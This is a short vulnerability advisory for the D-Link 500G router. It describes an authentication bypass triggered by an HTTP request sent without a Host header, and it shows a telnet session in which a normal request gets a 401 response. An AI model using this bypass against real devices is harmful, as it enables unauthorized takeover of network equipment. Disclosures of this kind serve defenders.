Subject: D-Link 500G Authentication Bypass

D-LINK 500G AUTHENTICATION BYPASS

SUMMARY
There is an authentication bypass vulnerability in D-Link 500G that allows
an attacker to take full control over the device.
Remote access is disabled by default, so the attacker is required to be on
the local network.
The bypass can be triggered sending a HTTP request without the HOST header.

$ telnet 192.168.0.1 80
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.
GET / HTTP/1.1
Host: 192.168.0.1
Connection: close

HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic Realm="DSL-500G"
Content-type: text/html
Content-length: 111
